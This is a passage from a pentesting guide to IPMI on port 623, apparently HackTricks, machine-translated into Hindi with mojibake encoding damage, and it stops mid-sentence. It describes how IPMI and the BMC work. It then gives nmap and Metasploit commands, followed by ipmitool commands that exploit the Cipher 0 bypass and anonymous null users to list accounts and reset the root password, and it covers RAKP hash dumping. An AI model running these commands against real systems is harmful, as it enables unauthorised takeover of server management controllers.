# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI\_Basics) (`IPMI`) рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рдмрдВрдзрди рдФрд░ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░-рдЖрдзрд╛рд░рд┐рдд рд╣реЛрд╕реНрдЯ рдкреНрд░рдмрдВрдзрди рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рдорд╛рдирдХреАрдХреГрдд рд╡рд┐рдирд┐рд░реНрджреЗрд╢ рд╣реИред рдпрд╣ рдПрдХ рд╕реНрд╡рддрдВрддреНрд░ рдЙрдкрдкреНрд░рдгрд╛рд▓реА рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╣реЛрд╕реНрдЯ рдХреЗ BIOS, CPU, firmware рдФрд░ рдЖрдзрд╛рд░рднреВрдд рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдмрд╛рд╣рд░реА рдЙрдкрдпреЛрдЧ рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред IPMI рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рдмрдВрдзрдХреЛрдВ рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдФрд░ рдореЙрдирд┐рдЯрд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╡реЗ рдмрдВрдж рд╣реЛ рдЧрдП рд╣реЛрдВ рдпрд╛ рдЕрдиреБрдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рд╢реАрд▓ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╣реЛрдВред рдпрд╣ рд╕реАрдзреЗ рдиреЗрдЯрд╡рд░реНрдХ рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдФрд░ рд▓реЙрдЧрд┐рди рд╢реИрд▓реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред IPMI рдХрд╛ рдЙрдкрдпреЛрдЧ рдЯрд╛рд░рдЧреЗрдЯ рд╣реЛрд╕реНрдЯ рдХреЗ рдмрд┐рдирд╛ рд╢рд╛рд░реАрд░рд┐рдХ рдкрд╣реБрдВрдЪ рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд░рд┐рдореЛрдЯ рдЕрдкрдЧреНрд░реЗрдб рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред IPMI рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддреАрди рддрд░реАрдХреЛрдВ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

* рдЬрдм рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдмреВрдЯ рдирд╣реАрдВ рд╣реБрдЖ рд╣реЛ рддреЛ BIOS рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП
* рдЬрдм рд╣реЛрд╕реНрдЯ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдмрдВрдж рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ
* рд╕рд┐рд╕реНрдЯрдо рдЕрд╕рдлрд▓рддрд╛ рдХреЗ рдмрд╛рдж рд╣реЛрд╕реНрдЯ рддрдХ рдкрд╣реБрдВрдЪ

рдпреЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реЛ рд░рд╣реЗ рд╣реЛрдиреЗ рдкрд░, IPMI рд╡рд┐рднрд┐рдиреНрди рдЪреАрдЬреЛрдВ рдХреА рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рд╕рд┐рд╕реНрдЯрдо рддрд╛рдкрдорд╛рди, рд╡реЛрд▓реНрдЯреЗрдЬ, рдлреИрди рд╕реНрдерд┐рддрд┐ рдФрд░ рдкрд╛рд╡рд░ рд╕рдкреНрд▓рд╛рдИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрдиреНрд╡реЗрдВрдЯрд░реА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдкреНрд░рд╢реНрди рдХрд░рдиреЗ, рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рд▓реЙрдЧ рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рдиреЗ рдФрд░ SNMP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрд▓рд░реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣реЛрд╕реНрдЯ рд╕рд┐рд╕реНрдЯрдо рдмрдВрдж рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди IPMI рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрд╛рд╡рд░ рд╕реНрд░реЛрдд рдФрд░ рдПрдХ LAN рдХрдиреЗрдХреНрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

IPMI рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рдкрд╣рд▓реА рдмрд╛рд░ 1998 рдореЗрдВ Intel рдиреЗ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд┐рдпрд╛ рдерд╛ рдФрд░ рдЕрдм рдпрд╣ Cisco, Dell, HP, Supermicro, Intel рдФрд░ рдЕрдиреНрдп 200 рд╕реЗ рдЕрдзрд┐рдХ рд╕рд┐рд╕реНрдЯрдо рд╡рд┐рдХреНрд░реЗрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдорд░реНрдерд┐рдд рд╣реИред IPMI рд╕рдВрд╕реНрдХрд░рдг 2.0 рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реАрд░рд┐рдпрд▓ рдУрд╡рд░ LAN рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рдмрдВрдзрдХреЛрдВ рдХреЛ рдмреИрдВрдб рдореЗрдВ рд╕реАрд░рд┐рдпрд▓ рдХрдВрд╕реЛрд▓ рдЖрдЙрдЯрдкреБрдЯ рджреЗрдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдорд┐рд▓рддреА рд╣реИред IPMI рдХреЛ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдШрдЯрдХреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:

* Baseboard Management Controller (BMC) - IPMI рдХрд╛ рдПрдХ рдорд╛рдЗрдХреНрд░реЛ-рдХрдВрдЯреНрд░реЛрд▓рд░ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдШрдЯрдХ
* Intelligent Chassis Management Bus (ICMB) - рдПрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдЬреЛ рдПрдХ рдЪреЗрд╕рд┐рд╕ рд╕реЗ рджреВрд╕рд░реЗ рдЪреЗрд╕рд┐рд╕ рддрдХ рд╕рдВрдЪрд╛рд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ
* Intelligent Platform Management Bus (IPMB) - BMC рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░ рдХрд░рддрд╛ рд╣реИ
* IPMI Memory - рд╕рд┐рд╕реНрдЯрдо рдШрдЯрдирд╛ рд▓реЙрдЧ, рд░реЗрдкреЛрдЬрд┐рдЯрд░реА рд╕реНрдЯреЛрд░ рдбреЗрдЯрд╛ рдФрд░ рдЕрдзрд┐рдХ рдЬреИрд╕реА рдЪреАрдЬреЛрдВ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ
* рд╕рдВрдЪрд╛рд░ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ - рд╕реНрдерд╛рдиреАрдп рд╕рд┐рд╕реНрдЯрдо рдЗрдВрдЯрд░рдлрд╝реЗрд╕, рд╕реАрд░рд┐рдпрд▓ рдФрд░ LAN рдЗрдВрдЯрд░рдлрд╝реЗрд╕, ICMB рдФрд░ PCI рдкреНрд░рдмрдВрдзрди рдмрд╕

![](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ**: 623/UDP/TCP (рдпрд╣ рдЖрдорддреМрд░ рдкрд░ UDP рдкрд░ рд╣реЛрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ TCP рдкрд░ рднреА рдЪрд▓ рд╕рдХрддрд╛ рд╣реИ)

## рдЬрд╛рдВрдЪ

### рдЦреЛрдЬ
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдкрд╣рдЪрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### рд╕рдВрдХрдЯрд╛рд╕реНрдкрджрддрд╛ - рд╕рд╛рдЗрдлрд░ 0 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ IPMI рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдИрдкрд╛рд╕

рдбреИрди рдлрд╛рд░реНрдорд░ рдиреЗ IPMI 2.0 рд╡рд┐рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдПрдХ рдЧрдВрднреАрд░ рджреБрд░реНрдмрд▓рддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдХреА рд╣реИ, рдЕрд░реНрдерд╛рдд рд╕рд╛рдЗрдлрд░ рдкреНрд░рдХрд╛рд░ 0, рдЬреЛ рдХреНрд▓рд┐рдпрдВрдЯ рдХреЛ рд╕рд╛рдл-рдкрд╛рда рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ рдХрд╛ рд╕рдВрдХреЗрддрдХ рд╣реИ, рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ **рдХрд┐рд╕реА рднреА рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдкрд╣реБрдВрдЪ рджреЗрддрд╛ рд╣реИ**ред рд╕рд╛рдЗрдлрд░ 0 рд╕рдорд╕реНрдпрд╛рдПрдВ рдПрдЪрдкреА, рдбреЗрд▓ рдФрд░ рд╕реБрдкрд░рдорд╛рдЗрдХреНрд░реЛ рдмреАрдПрдорд╕реА рдореЗрдВ рдкрд╣рдЪрд╛рдиреА рдЧрдИрдВ рд╣реИрдВ, рдЬрд╣рд╛рдВ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕рднреА IPMI 2.0 рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрдиреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХрд╛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдкрд╣рд▓реЗ **рдПрдХ рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╣реЛрдЧрд╛ред

рдЖрдк рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХреА **рдкрд╣рдЪрд╛рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
рдФрд░ рдЖрдк `ipmitool` рдХреЗ рд╕рд╛рде рдЗрд╕ рдореБрджреНрджреЗ рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
apt-get install ipmitool #Install
#Using -C 0 any password is accepted
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list #Use Cipher 0 to dump a list of users
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 #Change the password of root
```
### рд╕рдВрдХрдЯрд╛рд╕реНрдкрджрддрд╛ - IPMI 2.0 RAKP рдкреНрд░рдорд╛рдгреАрдХрд░рдг рджреВрд░рд╕реНрде рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдкреНрд░рд╛рдкреНрддрд┐

рдореВрд▓ рд░реВрдк рд╕реЗ, **рдЖрдк рд╕рд░реНрд╡рд░ рд╕реЗ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдПрдХ рдирдордХреАрди рд╣реИрд╢ рдПрдордбреА5 рдФрд░ рдПрд╕рдПрдЪрдП1 рдХреЗ рд▓рд┐рдП рдорд╛рдВрдЧ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдореМрдЬреВрдж рд╣реИрдВ рддреЛ рд╡реЗ рд╣реИрд╢ рд╡рд╛рдкрд╕ рднреЗрдЬреЗ рдЬрд╛рдПрдВрдЧреЗред** рд╣рд╛рдБ, рдЬреИрд╕рд╛ рдХрд┐ рдпрд╣ рд╕реБрдирдиреЗ рдореЗрдВ рднреА рдЕрджреНрднреБрдд рд╣реИред рдФрд░ рдЗрд╕рдХреЗ рд▓рд┐рдП **рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЛрдЗрдЯ рдореЙрдбреНрдпреВрд▓** рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЖрдк рдЬреЙрди рдпрд╛ рд╣реИрд╢рдХреИрдЯ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдЖрдЙрдЯрдкреБрдЯ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ):
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдореЛрдВ рдХреА рд╕реВрдЪреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ (рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЛрдЗрдЯ рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ)ред_

`ipmitool` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЫреЛрдбрд╝рдХрд░ (`-c 0`) рд░реВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ abc123 рдореЗрдВ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП:
```
root@kali:~# apt-get install ipmitool
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123
```
### рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реНрдмрд▓рддрд╛ - IPMI рдЕрдирд╛рдо рдЕрдзрд┐рддрд╛рди

рдЙрдкрд░реЛрдХреНрдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбреИрди рдлрд╛рд░реНрдорд░ рдиреЗ рдзреНрдпрд╛рди рджрд┐рдпрд╛ рдХрд┐ **рдХрдИ BMCs "рдЕрдирд╛рдо" рдкрд╣реБрдВрдЪ рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдХреЗ рд╢рд┐рдк рдХрд░рддреЗ рд╣реИрдВ**ред рдЗрд╕реЗ рдкрд╣рд▓реЗ рдХреЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЦрд╛рддреЗ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЛ **рд╢реВрдиреНрдп рд╕реНрдЯреНрд░рд┐рдВрдЧ** рдкрд░ рд╕реЗрдЯ рдХрд░рдХреЗ рдФрд░ рдЙрд╕рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП **рд╢реВрдиреНрдп рдкрд╛рд╕рд╡рд░реНрдб** рд╕реЗрдЯ рдХрд░рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред _ipmi\_dumphashes_ рдореЙрдбреНрдпреВрд▓ рд╢реВрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ (рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рд░рд┐рдХреНрдд рдкрд╛рд╕рд╡рд░реНрдб) рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдЧрд╛ рдФрд░ рдбрдВрдк рдХрд░реЗрдЧрд╛ред **рдпрд╣ рдЦрд╛рддрд╛ рдЕрдкрдиреЗ рдЖрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдХрдард┐рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╣рдо `ipmitool` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдирд╛рдорд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЙрд╕ рдЦрд╛рддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list

ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
1                    false  false      true      ADMINISTRATOR
2  root            false  false      true      ADMINISTRATOR
3  admin            true    true      true      ADMINISTRATOR

ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword #Change the password of the user 2 (root) to "newpassword"
```
### рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реНрдмрд▓рддрд╛ - рд╕реБрдкрд░рдорд╛рдЗрдХреНрд░реЛ IPMI рдХреНрд▓рд┐рдпрд░-рдЯреЗрдХреНрд╕реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб

IPMI 2.0 рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ BMC HMAC рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдзрд┐рдпреЛрдВ рдЬреИрд╕реЗ SHA1 рдФрд░ MD5 рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░реЗрдВред рдЗрд╕ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреБрдЫ рдЧрдВрднреАрд░ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕рд╛ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╣реИрд╢ рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд▓рд┐рдпрд░-рдЯреЗрдХреНрд╕реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ BMC рдХреЛ **рд╕рднреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд╛рд╕рд╡рд░реНрдбреЛрдВ рдХреЗ рдХреНрд▓рд┐рдпрд░-рдЯреЗрдХреНрд╕реНрдЯ рд╕рдВрд╕реНрдХрд░рдг** рдХреЛ рдХрд┐рд╕реА рднреА **рдЕрд╕реНрдерд╛рдпреА рд╕рдВрдЧреНрд░рд╣рдг** рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рд╕реБрдкрд░рдорд╛рдЗрдХреНрд░реЛ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдпрд╣ рд╕реНрдерд╛рди рдлрд░реНрдорд╡реЗрдпрд░ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЗ рдмреАрдЪ рдмрджрд▓рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдпрд╛ рддреЛ **`/nv/PSBlock`** рдпрд╛ **`/nv/PSStore`** рд╣реЛрддрд╛ рд╣реИред рдкрд╛рд╕рд╡рд░реНрдб рд╡рд┐рднрд┐рдиреНрди рдмрд╛рдЗрдирд░реА рдмреНрд▓реЙрдмреНрд╕ рдХреЗ рдмреАрдЪ рдмрд┐рдЦрд░реЗ рд╣реБрдП рд╣реЛрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╡реЗ рд╣рдореЗрд╢рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рдмрд╛рдж рдЖрддреЗ рд╣реИрдВред рдпрд╣ рдХрд┐рд╕реА рднреА рд╕рдВрдЧрдарди рдХреЗ рд▓рд┐рдП рдПрдХ рдЧрдВрднреАрд░ рдореБрджреНрджрд╛ рд╣реИ рдЬреЛ BMC рдпрд╛ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдмреАрдЪ рд╕рд╛рдЭрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ 